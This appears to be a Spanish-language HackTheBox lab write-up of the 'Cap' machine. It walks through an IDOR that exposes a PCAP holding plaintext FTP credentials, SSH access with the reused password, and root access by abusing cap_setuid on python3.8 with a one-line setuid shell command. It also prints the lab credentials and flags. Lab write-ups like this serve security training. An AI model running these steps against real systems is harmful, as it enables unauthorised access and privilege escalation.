# Cap — HackTheBox Write-up

| Campo | Detalle |
|---|---|
| **Máquina** | Cap |
| **OS** | Linux (Ubuntu 20.04.2 LTS) |
| **Dificultad** | 🟢 Easy |
| **Fecha de pwn** | 18 Jun 2026 |
| **Autor** | Andres (yisus666-bit) |
| **Tags** | `idor`, `ftp`, `pcap`, `linux-capabilities`, `cap_setuid` |

---

## Resumen Ejecutivo

Cap es una máquina Linux de dificultad Easy que expone un **Security Dashboard** web corriendo sobre Gunicorn/Python. La aplicación permite generar capturas de red (PCAP) pero falla en controlar el acceso a capturas de otros usuarios, resultando en un **IDOR** (Insecure Direct Object Reference). Al acceder al PCAP con ID `0`, se obtienen credenciales FTP de Nathan en texto claro. Esa misma password funciona en SSH, logrando acceso inicial. La escalada a root se logra abusando de la capability `cap_setuid` asignada al binario `/usr/bin/python3.8`, que permite cambiar el UID del proceso a 0 sin necesitar sudo.

---

## Reconocimiento

### Escaneo de Puertos

```bash
nmap -sC -sV -oN nmap_cap.txt 10.129.30.246
```

**Resultados:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsFTPd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    gunicorn
```

**3 puertos TCP abiertos:** FTP, SSH y HTTP.

### Enumeración Web

```bash
curl -I http://10.129.30.246
```

```
Server: gunicorn
Content-Type: text/html; charset=utf-8
```

El servidor corre **Gunicorn**, lo que indica una aplicación Python (Flask/Django) en el backend.

Navegando a `http://10.129.30.246` se encuentra un **Security Dashboard** con las siguientes rutas expuestas en el HTML:

| Ruta | Función |
|---|---|
| `/` | Dashboard principal |
| `/capture` | Security Snapshot (genera PCAP de 5 segundos) |
| `/ip` | IP Config |
| `/netstat` | Network Status |

El dashboard muestra el nombre de usuario **Nathan** en la esquina superior derecha, confirmando un usuario válido en el sistema.

---

## Análisis de Vulnerabilidades

### IDOR en `/data/[id]`

**Tipo:** IDOR (Insecure Direct Object Reference)  
**CVSS:** Medium (5.3)

Al ejecutar un "Security Snapshot" desde `/capture`, la aplicación redirige a `/data/[id]` donde `[id]` es un número incremental que identifica la captura. La aplicación **no valida** que el usuario autenticado sea el propietario de la captura solicitada, permitiendo acceder a capturas de cualquier otro usuario simplemente modificando el ID en la URL.

Accediendo a `/data/0` se obtiene la primera captura generada en el sistema, que contiene tráfico sensible.

### Credenciales FTP en texto claro en PCAP

**Tipo:** Sensitive Data Exposure  
**Protocolo afectado:** FTP (sin cifrado)

El PCAP del ID `0` contiene una sesión FTP completa donde las credenciales viajan en texto claro, ya que FTP no cifra la autenticación.

### cap_setuid en Python3.8

**Tipo:** Linux Capability Abuse  
**Binario:** `/usr/bin/python3.8`  
**Capability:** `cap_setuid+eip`

La capability `cap_setuid` permite a un proceso cambiar su UID efectivo sin ser root. Asignada a Python, cualquier usuario del sistema puede invocar `os.setuid(0)` para obtener privilegios de root.

---

## Explotación

### Paso 1 — IDOR: Acceso al PCAP ID 0

Navegar en el browser a:

```
http://10.129.30.246/data/0
```

Descargar el archivo `0.pcap`.

### Paso 2 — Extracción de credenciales del PCAP

```bash
strings 0.pcap | grep -A5 "USER\|PASS"
```

**Output:**

```
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
```

Credenciales obtenidas:
- **Usuario:** `nathan`
- **Password:** `Buck3tH4TF0RM3!`

### Paso 3 — Acceso SSH con password reutilizada

```bash
ssh nathan@10.129.30.246
# Password: Buck3tH4TF0RM3!
```

```
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
nathan@cap:~$
```

### Paso 4 — User Flag

```bash
cat ~/user.txt
```

```
62da1bd76d305728926baa131b1595c9
```

---

## Escalada de Privilegios

### Enumeración de Capabilities

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

`/usr/bin/python3.8` tiene `cap_setuid` — puede cambiar el UID del proceso a cualquier valor, incluyendo 0 (root).

### Explotación de cap_setuid

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```
root@cap:/#
```

Una línea. Sin exploit, sin CVE. Solo abuso de una capability mal configurada.

### Root Flag

```bash
cat /root/root.txt
```

```
78bb55ed4849a865bc1fbc4535ad0125
```

---

## Lecciones Aprendidas

- **IDOR:** Nunca confiar en IDs secuenciales como control de acceso. La aplicación debe validar que el recurso pertenece al usuario autenticado antes de servirlo.
- **FTP sin cifrado:** FTP transmite credenciales en texto claro. En entornos modernos debe reemplazarse por SFTP o FTPS.
- **Reutilización de contraseñas:** La misma password usada en FTP funcionó en SSH. Las credenciales deben ser únicas por servicio.
- **Linux Capabilities:** Las capabilities son una alternativa granular a SUID, pero `cap_setuid` en un intérprete como Python es equivalente a darle SUID — cualquier usuario puede escalar a root trivialmente.

---

## Herramientas Utilizadas

| Herramienta | Uso |
|---|---|
| `nmap` | Escaneo de puertos y detección de servicios |
| `curl` | Verificación de headers HTTP |
| `strings` | Extracción de texto del PCAP |
| `ssh` | Acceso inicial como nathan |
| `getcap` | Enumeración de Linux capabilities |
| `python3.8` | Escalada de privilegios vía cap_setuid |

---

## Referencias

- [HackTricks — Linux Capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)
- [OWASP — IDOR](https://owasp.org/www-chapter-ghana/assets/slides/IDOR.pdf)
- [GTFOBins — Python cap_setuid](https://gtfobins.github.io/gtfobins/python/)

---

*Write-up por Andres | [LinkedIn](https://linkedin.com/in/andres-rojas-sojo-077a7a20b) | [GitHub](https://github.com/yisus666-bit)*
